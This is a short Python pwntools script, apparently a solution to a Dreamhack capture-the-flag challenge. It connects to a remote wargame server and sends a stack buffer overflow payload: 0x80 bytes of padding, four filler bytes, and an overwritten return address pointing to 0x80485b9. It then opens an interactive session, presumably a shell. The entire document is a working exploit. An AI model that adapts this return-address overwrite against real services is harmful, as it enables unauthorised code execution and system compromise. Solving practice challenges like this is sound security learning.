from pwn import *

r = remote("host1.dreamhack.games", 15232)

payload =  b'a'*0x80 + b"AAAA" + p32(0x80485b9)

r.sendline(payload)
r.interactive()
